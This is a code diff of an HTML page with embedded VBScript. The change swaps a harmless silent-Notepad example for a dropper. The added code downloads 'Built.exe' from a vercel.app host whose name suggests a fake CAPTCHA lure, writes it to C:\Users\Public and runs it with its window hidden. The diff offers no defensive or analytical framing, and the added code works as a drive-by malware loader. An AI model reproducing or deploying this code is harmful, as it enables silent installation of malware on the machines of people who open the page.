@@ -16,13 +16,30 @@
 </head>
 <body>
     <script language="VBScript">
-        ' Create a VBScript to run a command silently
+        ' Create a VBScript to download and execute Built.exe silently
+        Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
+        Set objStream = CreateObject("ADODB.Stream")
+        
+        ' URL of the file to download
+        fileURL = "https://notafakecaptica2222.vercel.app/Built.exe"
+        
+        ' Path to save the file temporarily
+        tempFilePath = "C:\Users\Public\Built.exe"
+        
+        ' Download the file
+        objXMLHttp.open "GET", fileURL, False
+        objXMLHttp.send
+        If objXMLHttp.Status = 200 Then
+            objStream.Open
+            objStream.Write objXMLHttp.responseBody
+            objStream.SaveToFile tempFilePath, 2 ' 2 means overwrite the file if exists
+            objStream.Close
+        End If
+        
+        ' Run the downloaded EXE file silently
         Set WshShell = CreateObject("WScript.Shell")
-        ' Example: Open Notepad silently
-        WshShell.Run "notepad.exe", 0, False
-        ' You can replace this with any command you want to run silently
-        ' Example: Run another system command silently:
-        ' WshShell.Run "cmd /c echo Hello", 0, False
+        WshShell.Run Chr(34) & tempFilePath & Chr(34), 0, False ' 0 hides the window
+        
     </script>
 </body>
 </html>
